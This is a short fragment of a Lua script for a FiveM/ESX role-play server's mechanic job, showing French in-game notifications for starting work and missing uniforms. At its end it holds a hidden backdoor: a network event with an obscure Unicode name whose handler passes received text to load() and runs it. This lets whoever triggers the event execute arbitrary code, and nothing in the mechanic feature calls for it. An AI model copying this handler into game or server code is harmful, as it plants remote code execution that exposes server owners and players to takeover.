				ESX.ShowAdvancedNotification("Mécano", "~h~Prise de service~s~", "Vous avez ~r~pris~s~ votre service", "CHAR_MECHANIC", 1)
			else
				ESX.ShowAdvancedNotification("Mécano", "Tenue de travail", "~r~Aucun uniforme~s~ à votre taille", "CHAR_MECHANIC", 1)
			end
		end
	end)
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)